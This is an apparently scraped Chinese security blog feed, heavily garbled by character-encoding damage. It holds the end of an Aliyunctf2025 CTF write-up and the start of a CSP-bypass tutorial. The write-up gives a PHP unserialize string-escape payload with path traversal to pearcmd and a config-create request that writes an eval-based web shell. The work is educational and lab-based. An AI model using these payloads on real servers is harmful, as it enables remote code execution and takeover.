exit;//æ›¿æ¢ä¸ºç©ºï¼Œè¿™é‡Œçœ‹ä¸€ä¸‹æ€ä¹ˆåˆ©ç”¨ã€‚åŸºæœ¬æ€è·¯å°±æ˜¯å°†backgroundé‡Œé¢å¯¹åº”çš„okç»™åˆ å»ï¼Œæ›¿æ¢ä¸ºpearcmdå†…å®¹ã€‚\nçœ‹äº†ä¸€ä¸‹ï¼Œæ„Ÿè§‰è¿™é‡Œæ˜¯éœ€è¦ç»“åˆå½“æ—¶å­—ç¬¦ä¸²å¢å¤šçš„ç‰¹æ€§æ¥ä½¿ç”¨çš„ï¼Œå°±æ˜¯ååºåˆ—åŒ–æ—¶åŒ¹é…åˆ°è¶³å¤Ÿçš„å­—ç¬¦ï¼Œç„¶åå°±ä¸ä¼šå†åŒ¹é…åé¢çš„å­—ç¬¦äº†,è¿™é‡Œéœ€è¦å°†\u0026quot;;s:4:\u0026quot;time\u0026quot;;s:5:\u0026quot;åæ‰ï¼Œç„¶åé©¬ä¸Šå°†timeçš„å€¼ç»™è®¾ç½®ç»™æŒ‡å®šçš„å€¼ï¼Œåœ¨åæ‰ç»“æŸåï¼Œé©¬ä¸ŠåŒ¹é…ä¸€ä¸ª\u0026quot;+åç»­å­—ç¬¦æ¥æ„æˆä¸€ä¸ªå®Œæ•´çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œç„¶åè¿™é‡Œçš„é•¿åº¦åŒ¹é…å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 print(len(\u0026#39;\u0026#34;;s:4:\u0026#34;time\u0026#34;;s:5:\u0026#34;xxxxxxxx\u0026#39;)) a=\u0026#39;\u0026#34;;s:10:\u0026#34;background\u0026#34;;s:7:\u0026#34;pearcmd\u0026#34;;}\u0026#39; print(len(\u0026#39;\u0026lt;?php exit;//\u0026#39;)) //output: 18 13 éœ€è¦æ”¹æˆé•¿åº¦åŒ¹é…ï¼Œè€Œæ•´æ•°å€ï¼Œè¿™é‡Œåªèƒ½ä¿®æ”¹å­—ç¬¦ä¸²é•¿åº¦ï¼Œæ‰€ä»¥è®©å¦‚ä¸‹å³å¯ï¼š\n1 2 3 4 5 6 print(len(\u0026#39;\u0026#34;;s:4:\u0026#34;time\u0026#34;;s:5:\u0026#34;xxxxxxxx\u0026#39;)) a=\u0026#39;\u0026#34;;s:10:\u0026#34;background\u0026#34;;s:7:\u0026#34;pearcmd\u0026#34;;}\u0026#39; print(len(\u0026#39;\u0026lt;?php exit;//\u0026#39;)) //output: 26 13 ä¼ å‚å°±å¦‚ä¸‹ä¼ å³å¯ï¼š\n1 xxxxxxxx\u0026#34;;s:4:\u0026#34;time\u0026#34;;s:5:\u0026#34;11112\u0026#34;;s:10:\u0026#34;background\u0026#34;;s:7:\u0026#34;pearcmd\u0026#34;;} çœ‹çœ‹è¾“å‡ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?php $arraya=serialize(array(\u0026#34;name\u0026#34;=\u0026gt;\u0026#34;fupanc\u0026#34;,\u0026#34;reason\u0026#34;=\u0026gt;\u0026#34;\u0026lt;?php exit;//\u0026lt;?php exit;//\u0026#34;,\u0026#34;time\u0026#34;=\u0026gt;\u0026#39;xxxxxxxx\u0026#34;;s:4:\u0026#34;time\u0026#34;;s:5:\u0026#34;11112\u0026#34;;s:10:\u0026#34;background\u0026#34;;s:7:\u0026#34;pearcmd\u0026#34;;}\u0026#39;,\u0026#34;background\u0026#34;=\u0026gt;\u0026#34;ok\u0026#34;)); $name=\u0026#34;fupanc\u0026#34;.\u0026#39;-\u0026#39;.date(\u0026#34;Y-m-d\u0026#34;); $file = $name . \u0026#39;.php\u0026#39;; $cachedata = \u0026#34;\u0026lt;?php exit;//\u0026#34; . $arraya; file_put_contents($file,$cachedata); $data=file_get_contents($file); $b=str_replace(\u0026#34;\u0026lt;?php exit;//\u0026#34;, \u0026#39;\u0026#39;, $data); echo $b; //output: a:4:{s:4:\u0026#34;name\u0026#34;;s:6:\u0026#34;fupanc\u0026#34;;s:6:\u0026#34;reason\u0026#34;;s:26:\u0026#34;\u0026#34;;s:4:\u0026#34;time\u0026#34;;s:66:\u0026#34;xxxxxxxx\u0026#34;;s:4:\u0026#34;time\u0026#34;;s:5:\u0026#34;11112\u0026#34;;s:10:\u0026#34;background\u0026#34;;s:7:\u0026#34;pearcmd\u0026#34;;}\u0026#34;;s:10:\u0026#34;background\u0026#34;;s:2:\u0026#34;ok\u0026#34;;} åœ¨ååºåˆ—åŒ–å°è¯•æ—¶è¿è¡ŒæŠ¥é”™ï¼Œå†çœ‹ï¼Œå‘ç°æ˜¯é•¿åº¦å‡ºäº†é—®é¢˜ï¼Œè¿™é‡Œçš„timeçš„é•¿åº¦ä¸º66ï¼Œä½†æ˜¯æˆ‘åŸå…ˆæµ‹è¯•çš„æ—¶å€™æ˜¯è®¾ç½®ä¸ºäº†ä¸€ä¸ªé•¿åº¦ä¸º5çš„å€¼ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦æ”¹ä¸€ä¸‹é•¿åº¦ï¼Œå‡å°‘ä¸€ä¸ªxå³å¯ï¼Œæœ€åå°è¯•å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?php $arraya=serialize(array(\u0026#34;name\u0026#34;=\u0026gt;\u0026#34;fupanc\u0026#34;,\u0026#34;reason\u0026#34;=\u0026gt;\u0026#34;\u0026lt;?php exit;//\u0026lt;?php exit;//\u0026#34;,\u0026#34;time\u0026#34;=\u0026gt;\u0026#39;xxxxxxx\u0026#34;;s:4:\u0026#34;time\u0026#34;;s:5:\u0026#34;11112\u0026#34;;s:10:\u0026#34;background\u0026#34;;s:7:\u0026#34;pearcmd\u0026#34;;}\u0026#39;,\u0026#34;background\u0026#34;=\u0026gt;\u0026#34;ok\u0026#34;)); $name=\u0026#34;fupanc\u0026#34;.\u0026#39;-\u0026#39;.date(\u0026#34;Y-m-d\u0026#34;); $file = $name . \u0026#39;.php\u0026#39;; $cachedata = \u0026#34;\u0026lt;?php exit;//\u0026#34; . $arraya; file_put_contents($file,$cachedata); $data=file_get_contents($file); $checkdata = unserialize(str_replace(\u0026#34;\u0026lt;?php exit;//\u0026#34;, \u0026#39;\u0026#39;, $data)); echo $checkdata[\u0026#39;background\u0026#39;].\u0026#34;.php\u0026#34;; è¾“å‡ºä¸ºï¼š\n1 pearcmd.php æˆåŠŸäº†ï¼ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ‰“äº†ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„ä¸€ä¸‹æ–‡ä»¶åŒ…å«çš„è·¯å¾„ï¼Œç”±äºä»£ç é€»è¾‘æ‹¼æ¥äº†è·¯å¾„ï¼Œæ‰€ä»¥éœ€è¦è¿›è¡Œç›®å½•ç©¿è¶Šï¼Œæœ€åçš„payloadå¦‚ä¸‹:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?php $arraya=serialize(array(\u0026#34;name\u0026#34;=\u0026gt;\u0026#34;fupanc\u0026#34;,\u0026#34;reason\u0026#34;=\u0026gt;\u0026#34;\u0026lt;?php exit;//\u0026lt;?php exit;//\u0026#34;,\u0026#34;time\u0026#34;=\u0026gt;\u0026#39;xxxxxxx\u0026#34;;s:4:\u0026#34;time\u0026#34;;s:5:\u0026#34;11112\u0026#34;;s:10:\u0026#34;background\u0026#34;;s:37:\u0026#34;../../../../usr/local/lib/php/pearcmd\u0026#34;;}\u0026#39;,\u0026#34;background\u0026#34;=\u0026gt;\u0026#34;ok\u0026#34;)); $name=\u0026#34;fupanc\u0026#34;.\u0026#39;-\u0026#39;.date(\u0026#34;Y-m-d\u0026#34;); $file = $name . \u0026#39;.php\u0026#39;; $cachedata = \u0026#34;\u0026lt;?php exit;//\u0026#34; . $arraya; file_put_contents($file,$cachedata); $data=file_get_contents($file); $checkdata = unserialize(str_replace(\u0026#34;\u0026lt;?php exit;//\u0026#34;, \u0026#39;\u0026#39;, $data)); echo $checkdata[\u0026#39;background\u0026#39;].\u0026#34;.php\u0026#34;; //output: ../../../../usr/local/lib/php/pearcmd.php å†ç®€å•è¿›è¡Œä¸€ä¸‹é¢„æœŸè§£çš„åšæ³•ï¼š\nåœ¨login.phpæ–‡ä»¶å†…å®¹ä¸­å¯ä»¥çœ‹åˆ°ç™»å½•ä»¥åŠå­˜å…¥æ•°æ®åº“çš„é€»è¾‘ï¼Œå¹¶ä¸”æ˜¯ç›´æ¥å†™å…¥webæ•°æ®åº“çš„ï¼Œç›´æ¥è¿æ¥å³å¯ï¼Œç„¶åè‡ªå·±å†™ä¸€ä¸ªå°±è¡Œäº†ï¼š\n1 2 3 4 \u0026lt;?php $code=2222; $password=\u0026#34;2222\u0026#34;; echo md5($code.$password).\u0026#39;:\u0026#39;.$code; è¾“å‡ºå†…å®¹ä½œä¸ºå¯†ç ï¼Œç„¶åå»ºç«‹æ•°æ®ï¼š\nç„¶åç›´æ¥ç™»å½•å³å¯ï¼šusername:fupanc password:2222 code:2222ã€‚\nè¿™æ ·å°±èƒ½å¤Ÿè¿›å…¥index.phpé¡µé¢è¿›è¡Œæ–‡ä»¶åŒ…å«äº†ï¼Œä¸ºäº†èƒ½å¤Ÿæ§åˆ¶date()å‡½æ•°ä¼ å‚ï¼Œéœ€è¦åŠ ä¸€ä¸ª\\ï¼Œè¿™é‡Œç›´æ¥ç”¨è„šæœ¬æ¥åˆ†å‰²ï¼š\n1 2 3 input_str = \u0026#39;xxxxxxx\u0026#34;;s:4:\u0026#34;time\u0026#34;;s:5:\u0026#34;11112\u0026#34;;s:10:\u0026#34;background\u0026#34;;s:37:\u0026#34;../../../../usr/local/lib/php/pearcmd\u0026#34;;}\u0026#39; output_str = \u0026#39;\u0026#39;.join([f\u0026#39;\\\\{c}\u0026#39; for c in input_str]) print(output_str) å¾—åˆ°ï¼š\n1 \\x\\x\\x\\x\\x\\x\\x\\\u0026#34;\\;\\s\\:\\4\\:\\\u0026#34;\\t\\i\\m\\e\\\u0026#34;\\;\\s\\:\\5\\:\\\u0026#34;\\1\\1\\1\\1\\2\\\u0026#34;\\;\\s\\:\\1\\0\\:\\\u0026#34;\\b\\a\\c\\k\\g\\r\\o\\u\\n\\d\\\u0026#34;\\;\\s\\:\\3\\7\\:\\\u0026#34;\\.\\.\\/\\.\\.\\/\\.\\.\\/\\.\\.\\/\\u\\s\\r\\/\\l\\o\\c\\a\\l\\/\\l\\i\\b\\/\\p\\h\\p\\/\\p\\e\\a\\r\\c\\m\\d\\\u0026#34;\\;\\} ä»ä»£ç é€»è¾‘ä¸­å¯ä»¥å¾—åˆ°ä¼ ä¸¤æ¬¡ï¼Œä¸€æ¬¡å†™å…¥æ–‡ä»¶ï¼Œä¸€æ¬¡è¯»å–ä¸ºæ–‡ä»¶ä»è€ŒåŒ…å«ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;?php include \u0026#39;./cache.php\u0026#39;; $check=new checkin(); if(isset($_POST[\u0026#39;reason\u0026#39;])){ if(isset($_GET[\u0026#39;debug_buka\u0026#39;])) { $time=date($_GET[\u0026#39;debug_buka\u0026#39;]); }else{ $time=date(\u0026#34;Y-m-d H:i:s\u0026#34;); } $arraya=serialize(array(\u0026#34;name\u0026#34;=\u0026gt;$_SESSION[\u0026#39;username\u0026#39;],\u0026#34;reason\u0026#34;=\u0026gt;$_POST[\u0026#39;reason\u0026#39;],\u0026#34;time\u0026#34;=\u0026gt;$time,\u0026#34;background\u0026#34;=\u0026gt;\u0026#34;ok\u0026#34;)); $check-\u0026gt;writec($_SESSION[\u0026#39;username\u0026#39;].\u0026#39;-\u0026#39;.date(\u0026#34;Y-m-d\u0026#34;),$arraya); } if(isset($_GET[\u0026#39;check\u0026#39;])){ $cachefile = \u0026#39;/var/www/html/cache/\u0026#39; . $_SESSION[\u0026#39;username\u0026#39;].\u0026#39;-\u0026#39;.date(\u0026#34;Y-m-d\u0026#34;). \u0026#39;.php\u0026#39;; if (is_file($cachefile)) { $data=file_get_contents($cachefile); $checkdata = unserialize(str_replace(\u0026#34;\u0026lt;?php exit;//\u0026#34;, \u0026#39;\u0026#39;, $data)); $check=\u0026#34;/var/www/html/\u0026#34;.$checkdata[\u0026#39;background\u0026#39;].\u0026#34;.php\u0026#34;; include \u0026#34;$check\u0026#34;; } } ?\u0026gt; ç¬¬ä¸€æ¬¡ä¼ å‚å¦‚ä¸‹ï¼š\n1 2 3 getä¼ å‚ï¼šdebug_buka=\\x\\x\\x\\x\\x\\x\\x\\\u0026#34;\\;\\s\\:\\4\\:\\\u0026#34;\\t\\i\\m\\e\\\u0026#34;\\;\\s\\:\\5\\:\\\u0026#34;\\1\\1\\1\\1\\2\\\u0026#34;\\;\\s\\:\\1\\0\\:\\\u0026#34;\\b\\a\\c\\k\\g\\r\\o\\u\\n\\d\\\u0026#34;\\;\\s\\:\\3\\7\\:\\\u0026#34;\\.\\.\\/\\.\\.\\/\\.\\.\\/\\.\\.\\/\\u\\s\\r\\/\\l\\o\\c\\a\\l\\/\\l\\i\\b\\/\\p\\h\\p\\/\\p\\e\\a\\r\\c\\m\\d\\\u0026#34;\\;\\} postä¼ å‚ï¼šreason=\u0026lt;?php exit;//\u0026lt;?php exit;// æœ‰ç¬¦å·ï¼Œæ³¨æ„urlç¼–ç ï¼Œå¦‚ä¸‹:\nç¬¬äºŒæ¬¡ä¼ å‚ï¼š\n1 getä¼ å‚ï¼š?+config-create+/\u0026amp;check=1\u0026amp;/\u0026lt;?=@eval($_POST[\u0026#39;cmd\u0026#39;]);?\u0026gt;+/var/www/html/1234.php å¦‚ä¸‹ï¼š\nè¿™é‡Œç®€å•æ³¨æ„ä¸€ä¸‹æ ¼å¼å§ï¼Œè¿™ä¸ªconfig-createä¸æ˜¯æœ‰ä¸¤ç§æ ¼å¼å—ï¼Œå¦å¤–ä¸€ç§æ ¼å¼åªæœ‰å®˜æ–¹wpé‚£æ ·å¯ä»¥å†™è¿›å»ã€‚\næœ€åè¿›è¡Œå‘½ä»¤æ‰§è¡Œå³å¯ï¼š\nåŒæ ·æ‹¿åˆ°flagã€‚\nåé¢çš„ä¸¤é“javaé¢˜æ‰“çš„æ—¶å€™æ²¡æ‰“å‡ºæ¥ï¼Œå°±åé¢å­¦äº†å†æ¥å¤ç°å§ã€‚\nJtools Java Tools\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\nEspresso Coffee Buy me a cup of Espresso Coffee plz! Here are some JDK download links you may need\nhttps://gds.oracle.com/download/espresso/archive/espresso-java21-24.1.1-linux-amd64.tar.gz\nhttps://gds.oracle.com/download/espresso/archive/espresso-java21-24.1.1-linux-aarch64.tar.gz\nhttps://gds.oracle.com/download/espresso/archive/espresso-java21-24.1.1-macos-amd64.tar.gz\nhttps://gds.oracle.com/download/espresso/archive/espresso-java21-24.1.1-macos-aarch64.tar.gz\nhttps://gds.oracle.com/download/espresso/archive/espresso-java21-24.1.1-windows-amd64.zip\nhintï¼š\nFocus on the fields of org.graalvm.continuations.ContinuationImpl.FrameRecord\nAbuse org.graalvm.continuations.ContinuationImpl#stackFrameHead =\u0026gt; Hijack the Control Flow =\u0026gt; \u0026ldquo;ROP\u0026rdquo;\nCommand Exec Gadget\nsun.print.UnixPrintJob\nâ€”â€”â€”â€”â€”â€”â€”â€”\nå®˜æ–¹wpï¼š\nhttps://xz.aliyun.com/news/17029?time__1311=eqUxn7DQoYqGT4mqGXnjAD97YGOzO1tH4D\u0026u_atoken=fcc01ab1aceadb0f15326e34dbaa7b49\u0026u_asig=1a0c399b17406473291628172e011d\n","date":"2025-02-26T21:17:10+08:00","permalink":"https://fupanc-w1n.github.io/p/aliyunctf2025wp/","title":"Aliyunctf2025[WP]"},{"content":"CSPç»•è¿‡ å‰é¢äº†è§£äº†ä¸€ä¸‹HttpOnlyï¼Œåé¢å°±æ²¡æ€ä¹ˆå†å­¦ä¹ XSSçš„ä¸œè¥¿äº†ï¼Œè¿™é‡Œåˆé‡åˆ°äº†è¿™ä¸ªï¼Œå†æ¥å­¦ä¹ ä¸€ä¸‹ã€‚\nCSPç®€ä»‹ å†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆContent Security Policyï¼‰æ˜¯ä¸€ç§ç”¨äºç¼“è§£å¤§éƒ¨åˆ†ç±»å‹çš„å†…å®¹æ³¨å…¥æ”»å‡»çš„webåº”ç”¨æŠ€æœ¯ï¼Œæ¯”å¦‚xssã€æ•°æ®æ³¨å…¥ç­‰å¯å®ç°æ•°æ®çªƒå–ã€ç½‘ç«™ç ´åè¡Œä¸ºçš„å®‰å…¨é—®é¢˜ã€‚è¯¥ç­–ç•¥å¯ä»¥é€šè¿‡è®¾å®šè§„åˆ™ï¼Œæ¥é™åˆ¶æµè§ˆå™¨åªèƒ½åŠ è½½å’ŒæŒ‡å®šç‰¹å®šæ¥æºçš„èµ„æºï¼Œå½“æœ‰ä»éç™½åå•å…è®¸çš„JSè„šæœ¬å‡ºç°åœ¨é¡µé¢ä¸­ï¼Œæµè§ˆå™¨ä¼šé˜»æ­¢è„šæœ¬çš„æ‰§è¡Œï¼Œå¯ä»¥æœ‰æ•ˆå‡å°‘XSSç­‰æ”»å‡»çš„é£é™©ã€‚ä½†æ˜¯åŒæ ·å­˜åœ¨ç»•è¿‡æ‰‹æ®µã€‚\nCSPå¯ä»¥åˆ†ä¸ºå¦‚ä¸‹ä¸¤ç§ï¼š\nContent-Security-Policyï¼š é€šè¿‡å“åº”å¤´æ¥è®¾ç½®ï¼Œæµè§ˆå™¨æ¥æ”¶åˆ°è¿™ä¸ªå¤´åï¼Œä¼šç«‹å³æ‰§è¡Œç­–ç•¥ã€‚\nContent-Security-Policy-Report-Onlyï¼š åŒæ ·çš„é€šè¿‡å“åº”å¤´æ¥è®¾ç½®ï¼Œè¿™ä¸ªè¡¨ç¤ºä¸æ‰§è¡Œé™åˆ¶é€‰é¡¹ï¼Œåªè®°å½•æœªè¿åé™åˆ¶çš„è¡Œä¸ºï¼Œå¹¶ä¸”å¿…é¡»ä¸report-urié€‰é¡¹é…åˆä½¿ç”¨ã€‚ç®€å•æ¥è¯´ï¼Œå°±æ˜¯å¯ä»¥é€šè¿‡è¿™ä¸ªHTTPå¤´éƒ¨æ¥è®¾ç½®è§„åˆ™ï¼ŒåŒæ—¶å¿…é¡»è¦è®¾ç½®æŠ¥å‘Šçš„uriï¼Œå½“å‰ç«¯é¡µé¢çš„åŠ è½½è¿åè§„åˆ™ï¼Œæµè§ˆå™¨åªä¼šä»¥JSONæ ¼å¼å‘URIå‘é€æŠ¥å‘Šï¼Œè€Œä¸ä¼šé™åˆ¶ã€‚å…·ä½“å¯ä»¥å‚è€ƒ ã€ŠContent-Security-Policy-Report-Onlyã€‹\nCSPç­–ç•¥çš„ä½¿ç”¨ ç®€å•è¯´äº†ä¸€ä¸‹CSPçš„åˆ†ç±»ï¼Œé‚£ä¹ˆå¦‚ä½•ä½¿ç”¨å‘¢ï¼Ÿå¯ä»¥é€šè¿‡å¦‚ä¸‹ä¸¤ä¸ªæ–¹å¼ï¼š\nHTTPå“åº”å¤´ï¼ŒContent-Security-Policyå“åº”å¤´ï¼Œä¹Ÿå°±æ˜¯å‰é¢è¯´çš„é‚£ä¸ªã€‚\nç›´æ¥é€šè¿‡ç½‘é¡µå‰ç«¯çš„ \u0026lt;mata\u0026gt; æ ‡ç­¾\nâ€”â€”â€”â€”â€”â€”\nï¼ˆ1ï¼‰å¸¸ç”¨çš„ç­–ç•¥æŒ‡ä»¤ï¼š\nscript-srcï¼šå®šä¹‰äº†é¡µé¢ä¸­Javascriptçš„æœ‰æ•ˆæ¥æº style-srcï¼šå®šä¹‰äº†é¡µé¢ä¸­CSSæ ·å¼çš„æœ‰æ•ˆæ¥æº img-srcï¼šå®šä¹‰äº†é¡µé¢ä¸­å›¾ç‰‡å’Œå›¾æ ‡çš„æœ‰æ•ˆæ¥æº font-srcï¼šå®šä¹‰äº†å­—ä½“åŠ è½½çš„æœ‰æ•ˆæ¥æº connect-srcï¼šå®šä¹‰äº†è¯·æ±‚ï¼Œå¦‚XMLHttpRequestï¼ˆAJAXè¯·æ±‚ï¼‰ã€WebSocketå’ŒEventSourceçš„è¿æ¥æ¥æºã€‚ child-srcï¼šå®šä¹‰äº†web workersä»¥åŠåµŒå¥—çš„æµè§ˆä¸Šä¸‹æ–‡ï¼ˆå¦‚\u0026lt;frame\u0026gt;å’Œ\u0026lt;iframe\u0026gt;ï¼‰çš„æºã€‚ object-srcï¼šé™åˆ¶å¯ä»¥åŠ è½½å“ªäº›æ’ä»¶ï¼ˆä¾‹å¦‚Flashã€XSSç­‰ï¼‰ default-srcï¼šå®šä¹‰é‚£äº›æ²¡æœ‰è¢«æ›´ç²¾ç¡®æŒ‡ä»¤æŒ‡å®šçš„å®‰å…¨ç­–ç•¥ï¼Œä¹Ÿå°±æ˜¯ä¸Šé¢è¯´çš„é‚£äº›ç­‰ï¼Œä½†æ˜¯ä¹Ÿæœ‰çš„æŒ‡ä»¤ä¸ä¼šè¢«æŒ‡å®šï¼Œæ¯”å¦‚base-uriï¼Œè¿™ä¸ªåœ¨åé¢çš„CSPç»•è¿‡ä¼šè¯´ã€‚ ï¼ˆ2ï¼‰å†…å®¹æºçš„å‡ ç‚¹è¯´æ˜ï¼š\nå…¶å®å°±æ˜¯å–å€¼ï¼Œæ—¢ç„¶æœ‰æœ‰äº†æŒ‡ä»¤ï¼Œé‚£ä¹ˆè‚¯å®šè¦æœ‰æŒ‡ä»¤å†…å®¹ï¼Œè¿™é‡Œç®€å•è¯´å‡ ä¸ªï¼š\n1 2 3 4 5 6 7 8 9 * : æ˜Ÿå·è¡¨ç¤ºå…è®¸ä»»ä½•URLèµ„æºï¼Œæ²¡æœ‰é™åˆ¶ \u0026#39;none\u0026#39;ï¼šè¡¨ç¤ºä¸åŒ¹é…ä»»ä½•èµ„æº \u0026#39;self\u0026#39; åŒæºç­–ç•¥,å³å…è®¸åŒåŸŸååŒç«¯å£ä¸‹,åŒåè®®ä¸‹çš„è¯·æ±‚ \u0026#39;unsafe-inline\u0026#39; å…è®¸ä½¿ç”¨å†…è”èµ„æºï¼Œä¹Ÿå°±æ˜¯å…è®¸\u0026lt;script\u0026gt;ç­‰æ ‡ç­¾å’Œäº‹ä»¶ç›‘å¬å‡½æ•°çš„æ‰§è¡Œï¼Œä¸€èˆ¬ä¸ä¼šä½¿ç”¨ \u0026#39;unsafe-eval\u0026#39; å…è®¸ä¸å®‰å…¨çš„åŠ¨æ€ä»£ç æ‰§è¡Œ,å¦‚jsä¸­çš„eval() Function()ç­‰å‡½æ•° https: åªå…è®¸é€šè¿‡httpsåè®®åŠ è½½èµ„æº nonce: æ¯æ¬¡HTTPå›åº”ç»™å‡ºä¸€ä¸ªæˆæƒtoken,é¡µé¢å†…åµŒè„šæœ¬å¿…é¡»æœ‰è¿™ä¸ªtoken,æ‰ä¼šæ‰§è¡Œ,è®¾ç½®å€¼ä¸ºï¼š\u0026#39;nonce-12345678\u0026#39; å¦‚ä¸‹ï¼š \u0026lt;script nonce=\u0026#34;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=\u0026#34;\u0026gt;alert(123)\u0026lt;/script\u0026gt; ç­‰ï¼Œæ³¨æ„å¦‚ä¸Šçš„å•å¼•å·æ˜¯å¿…é¡»çš„ã€‚å…¶ä»–çš„æŒ‡ä»¤åŠå†…å®¹å‚è€ƒï¼šã€ŠCSPã€‹\næœ€åç®€å•çœ‹çœ‹å¦‚ä½•è®¾ç½®ï¼Œå¯¹äºå“åº”å¤´ï¼Œå¦‚ä¸‹å³å¯ï¼š\n1 header(\u0026#34;Content-Security-Policy: script-src \u0026#39;self\u0026#39;\u0026#34;); å¯¹äºå‰ç«¯çš„\u0026lt;meta\u0026gt;æ ‡ç­¾ï¼Œç›´æ¥åœ¨å‰ç«¯å†™å°±è¡Œäº†ï¼Œä¸€èˆ¬æ˜¯åœ¨ HTML æ–‡æ¡£çš„ \u0026lt;head\u0026gt; éƒ¨åˆ†ä½¿ç”¨ \u0026lt;meta\u0026gt; æ ‡ç­¾æ¥å®šä¹‰ï¼ˆå¹¶ä¸”å¦‚æœå®šä¹‰åœ¨\u0026lt;body\u0026gt;æ ‡ç­¾åˆ™ä¼šè¢«æµè§ˆå™¨å¿½ç•¥å¯¼è‡´æ— æ³•å®æ–½CSPï¼‰ï¼Œæ¯”å¦‚ï¼š\n1 \u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;default-src \u0026#39;self\u0026#39; http://www.dlrb.com \u0026#39;unsafe-inline\u0026#39;\u0026#34; \u0026gt; éœ€è¦æ³¨æ„çš„æ˜¯ï¼š\nåœ¨ HTTP å“åº”å¤´ä¸­çš„ CSP ç­–ç•¥ä¼šå¯¹æ•´ä¸ªé¡µé¢ç”Ÿæ•ˆï¼ŒåŒ…æ‹¬å†…è”è„šæœ¬ã€å†…è”æ ·å¼ä»¥åŠå¤–éƒ¨èµ„æºçš„åŠ è½½ã€‚\n\u0026lt;meta\u0026gt;æ ‡ç­¾è®¾ç½®çš„ CSP ç­–ç•¥ä»…å¯¹å…¶ä¹‹åçš„èµ„æºç”Ÿæ•ˆï¼Œè€Œåœ¨ \u0026lt;meta\u0026gt; æ ‡ç­¾ä¹‹å‰å­˜åœ¨å†…è”è„šæœ¬æˆ–æ ·å¼ï¼Œè¿™äº›å†…è”å†…å®¹ä¸ä¼šå—åˆ° CSP ç­–ç•¥çš„é™åˆ¶ã€‚å› æ­¤åº”ç¡®ä¿å°†å…¶æ”¾ç½®åœ¨ \u0026lt;head\u0026gt; éƒ¨åˆ†çš„æœ€å‰é¢ï¼Œä»¥è¦†ç›–æ‰€æœ‰å†…è”è„šæœ¬å’Œæ ·å¼ã€‚\nç®€å•æœ¬åœ°æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;script\u0026gt; // å†…è”è„šæœ¬ 1ï¼šæ­¤æ—¶ CSP å°šæœªç”Ÿæ•ˆ console.log(\u0026#34;å†…è”è„šæœ¬ 1 æ‰§è¡Œ\u0026#34;); \u0026lt;/script\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;script-src \u0026#39;none\u0026#39;\u0026#34;\u0026gt; \u0026lt;script\u0026gt; // å†…è”è„šæœ¬ 2ï¼šCSP å·²ç”Ÿæ•ˆï¼Œæ‰§è¡Œä¼šè¢«é˜»æ­¢ console.log(\u0026#34;å†…è”è„šæœ¬ 2 ä¸ä¼šæ‰§è¡Œ\u0026#34;); \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;!--\u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;script-src \u0026#39;none\u0026#39;\u0026#34;\u0026gt;--\u0026gt; \u0026lt;script\u0026gt; // å†…è”è„šæœ¬ 3ï¼šCSP å·²ç”Ÿæ•ˆï¼Œæ‰§è¡Œä¼šè¢«é˜»æ­¢ console.log(\u0026#34;å†…è”è„šæœ¬ 3 ä¸ä¼šæ‰§è¡Œ\u0026#34;); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; å¯ä»¥æ”¹æ”¹çœ‹çœ‹å‰é¢çš„è¯´æ˜ï¼Œå®Œå…¨æ­£ç¡®ã€‚\nCSPç»•è¿‡ å¦‚ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ç•™è¨€æ¡†+CSPçš„å‰ç«¯é¡µé¢ï¼Œä»¥è¿™ä¸ªä»£ç æ¥ç®€å•è°ˆè°ˆCSPç»•è¿‡ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;zh-CN\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;default-src \u0026#39;self\u0026#39;; script-src \u0026#39;self\u0026#39; \u0026#39;nonce-2726c7f26c9\u0026#39;; style-src \u0026#39;self\u0026#39; https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src \u0026#39;self\u0026#39; data:; object-src \u0026#39;none\u0026#39;; base-uri \u0026#39;self\u0026#39;; form-action \u0026#39;self\u0026#39;\u0026#34;\u0026gt; \u0026lt;title\u0026gt;å®‰å…¨ç•™è¨€æ¿\u0026lt;/title\u0026gt; \u0026lt;style nonce=\u0026#34;2726c7f26c9\u0026#34;\u0026gt; body { font-family: \u0026#39;Roboto\u0026#39;, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; } .container { background-color: #f5f5f5; padding: 20px; border-radius: 8px; } #messageInput { width: 70%; padding: 10px; margin-right: 10px; } button { padding: 10px 20px; background-color: #4CAF50; color: white; border: none; border-radius: 4px; cursor: pointer; } .message-item { background-color: white; padding: 15px; margin: 10px 0; border-radius: 4px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); } 